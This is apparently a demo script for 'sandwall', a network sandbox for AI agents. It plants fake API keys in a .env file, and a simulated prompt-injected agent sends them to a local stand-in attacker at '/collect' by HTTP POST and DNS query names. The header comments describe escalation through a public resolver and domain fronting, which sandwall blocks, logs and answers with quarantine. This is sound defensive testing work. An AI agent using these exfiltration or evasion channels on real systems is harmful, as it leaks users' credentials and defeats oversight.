#!/usr/bin/env bash
# sandwall demo: one prompt-injected agent, two sandboxes.
#
#   (a) an "open" sandbox: its own netns with plain NAT, like most sandboxes.
#       The agent reads a planted .env and exfiltrates it by HTTP POST and
#       through DNS query names. Both succeed.
#   (b) a sandwall sandbox with an allowlist for pypi/GitHub. The same agent
#       gets nothing out; the deny log and metrics show what it tried.
#   (c) the agent escalates: DNS straight to a public resolver, and domain
#       fronting through an allowlisted CDN address. Two such tricks trip the
#       policy's quarantine trigger: the sandbox is cut off, a signed webhook
#       reports it, and even the allowlisted sites are unreachable until
#       `sandwall sandbox release`.
#
# The "attacker" is a local listener in its own netns at 10.99.0.1, so the
# demo needs no internet access for the exfiltration itself; (b)'s final
# check and (c)'s fronting attempt use pypi.org.
#
# Usage (root, Linux): sudo SANDWALL=$PWD/bin/sandwall demo/exfil.sh
#   (behind an HTTP proxy, add REAL_PROXY=http://host:port)
set -uo pipefail

DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DEMO_DIR/../test/e2e/lib.sh"
ATTACKER_DNS_PORT=53 # the attacker runs a real nameserver for the DNS channel

OPEN_NS=demo-open
ORIG_FWD=$(sysctl -n net.ipv4.ip_forward)

if [[ -t 1 ]]; then BOLD=$'\e[1m' RED=$'\e[31m' GREEN=$'\e[32m' DIM=$'\e[2m' RESET=$'\e[0m'; else BOLD= RED= GREEN= DIM= RESET=; fi
step() { printf '\n%s== %s%s\n' "$BOLD" "$*" "$RESET"; }
note() { printf '%s%s%s\n' "$DIM" "$*" "$RESET"; }

HOOK_PID=""
cleanup() {
	[[ -n "$HOOK_PID" ]] && kill "$HOOK_PID" 2>/dev/null
	stop_daemon
	"$SANDWALL" "${G[@]}" nuke >/dev/null 2>&1
	ip netns pids "$OPEN_NS" 2>/dev/null | xargs -r kill 2>/dev/null
	ip link del dm-open0 2>/dev/null
	ip netns del "$OPEN_NS" 2>/dev/null
	rm -rf "/etc/netns/$OPEN_NS"
	nft delete table ip sandwall_demo 2>/dev/null
	sysctl -qw net.ipv4.ip_forward="$ORIG_FWD"
	teardown_attacker
	rm -rf "$T"
}
trap cleanup EXIT

# The agent's workspace with planted secrets, readable by the unprivileged agent.
chmod 711 "$T"
mkdir -p "$T/work"
cat >"$T/work/.env" <<'EOF'
OPENAI_API_KEY=sk-demo-9f2c1e7ab04d4c6e8a3b5d7f1e2c3a4b
AWS_SECRET_ACCESS_KEY=demo/K7MDENG+bPxRfiCYEXAMPLEKEY
EOF
cp "$DEMO_DIR/agent.py" "$T/work/agent.py"
chmod 755 "$T/work"
chmod 644 "$T/work/.env" "$T/work/agent.py"
AGENT=(python3 "$T/work/agent.py" --env "$T/work/.env" --url "http://$ATTACKER_IP:$ATTACKER_PORT/collect")
as_nobody=(setpriv --reuid=65534 --regid=65534 --clear-groups --inh-caps=-all --bounding-set=-all --no-new-privs --)

"$SANDWALL" "${G[@]}" nuke >/dev/null
setup_attacker || exit 1

step "(a) open sandbox: own netns, NAT to anywhere"
ip netns add "$OPEN_NS"
ip link add dm-open0 type veth peer name dm-open1
ip link set dm-open1 netns "$OPEN_NS"
ip addr add 10.250.0.1/30 dev dm-open0
ip link set dm-open0 up
ip -n "$OPEN_NS" addr add 10.250.0.2/30 dev dm-open1
ip -n "$OPEN_NS" link set dm-open1 up
ip -n "$OPEN_NS" link set lo up
ip -n "$OPEN_NS" route add default via 10.250.0.1
sysctl -qw net.ipv4.ip_forward=1
nft -f - <<'EOF'
table ip sandwall_demo {
	chain postrouting {
		type nat hook postrouting priority srcnat; policy accept;
		ip saddr 10.250.0.0/30 masquerade
	}
}
EOF
# A resolver the agent can reach; here it is the attacker's own nameserver,
# standing in for any recursive resolver that forwards to it.
mkdir -p "/etc/netns/$OPEN_NS"
echo "nameserver $ATTACKER_IP" >"/etc/netns/$OPEN_NS/resolv.conf"
: >"$ATTACKER_LOOT"
ip netns exec "$OPEN_NS" "${as_nobody[@]}" "${AGENT[@]}"
note "attacker received:"
if [[ -s "$ATTACKER_LOOT" ]]; then
	printf '%s' "$RED"; sed 's/^/    /' "$ATTACKER_LOOT"; printf '%s' "$RESET"
	printf '%s=> secrets exfiltrated%s\n' "$RED$BOLD" "$RESET"
fi

# A signed webhook receiver on loopback, standing in for a SOC endpoint, and
# the demo policy with alerts to it.
HOOKS="$T/hooks.jsonl"
HOOK_SECRET="demo-$(head -c16 /dev/urandom | xxd -p)"
printf '%s\n' "$HOOK_SECRET" >"$T/hook.key"
python3 "$DEMO_DIR/../test/e2e/webhook.py" --port 18081 --out "$HOOKS" --secret "$HOOK_SECRET" >/dev/null 2>&1 &
HOOK_PID=$!
{ cat "$DEMO_DIR/policy.yaml"; printf 'alerts:\n  webhooks: [soc]\n'; } >"$T/policy.yaml"
domains=$(awk '/^  allow_domains:/ {f = 1; next} /^  [a-z_]+:/ {f = 0} f && /^    - /' "$DEMO_DIR/policy.yaml" | wc -l)
deny_log() {
	"$SANDWALL" "${G[@]}" logs agent --deny-only |
		jq -r '"    \(.ts[11:23])  \(.type)  \(.verdict)/\(.reason // "-")" + (
			if .qname then "  \(.qtype) \(.qname)"
			elif .type == "quarantine" then ""
			elif .type == "relay" then "  \(.proto) \(.dst_ip):\(.dst_port) sni=\(.sni // "-")"
			else "  \(.proto) \(.dst_ip):\(.dst_port)" end)'
}

step "(b) sandwall sandbox: default deny, allowlist $domains domains"
start_daemon --webhook "soc=http://127.0.0.1:18081/hook" --webhook-secret "soc=$T/hook.key" || exit 1
"$SANDWALL" "${G[@]}" sandbox create agent --policy "$T/policy.yaml"
: >"$ATTACKER_LOOT"
"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}"
sleep 1
note "attacker received:"
if [[ -s "$ATTACKER_LOOT" ]]; then
	sed 's/^/    /' "$ATTACKER_LOOT"
	printf '%s=> LEAK%s\n' "$RED$BOLD" "$RESET"
	exit 1
fi
printf '    (nothing)\n%s=> nothing left the sandbox%s\n' "$GREEN$BOLD" "$RESET"

note "sandwall logs agent --deny-only:"
deny_log
seen=$(deny_log | wc -l)
note "metrics (curl :9464/metrics):"
curl -s http://127.0.0.1:19464/metrics | grep -E '^sandwall_(denied_total|dns_queries_total)\{.*sandbox="agent"' | sed 's/^/    /'

step "the agent can still do its job"
code=$("$SANDWALL" "${G[@]}" sandbox exec agent -- curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>&1)
printf '    curl https://pypi.org/simple/requests/ -> %s\n' "$code"

step "(c) the agent escalates"
"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}" --escalate
sleep 1
note "sandwall logs agent --deny-only (new lines):"
deny_log | tail -n +$((seen + 1))
note "sandwall sandbox list:"
"$SANDWALL" "${G[@]}" sandbox list | awk 'NR == 1 || $1 == "agent" {print "    " $1, $4}' | column -t | sed 's/^/    /'
note "webhook soc received (signature checked):"
jq -r '"    \(if .ok then "signature ok " else "BAD SIGNATURE" end)  " +
	([.body.events[] | "\(.type)/\(if .type == "quarantine" then .verdict else .reason // .verdict end)"] | group_by(.) | map("\(.[0]) x\(length)") | join(", "))' "$HOOKS"
note "the same allowlisted fetch, now from the quarantined sandbox:"
code=$("$SANDWALL" "${G[@]}" sandbox exec agent -- curl -sS -m 5 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>/dev/null)
printf '    curl https://pypi.org/simple/requests/ -> %s\n' "$code"
if [[ "$code" == 200 ]]; then
	printf '%s=> the sandbox was not cut off%s\n' "$RED$BOLD" "$RESET"
	exit 1
fi
printf '%s=> quarantined: cut off, kept for forensics (sandwall sandbox release agent)%s\n' "$GREEN$BOLD" "$RESET"

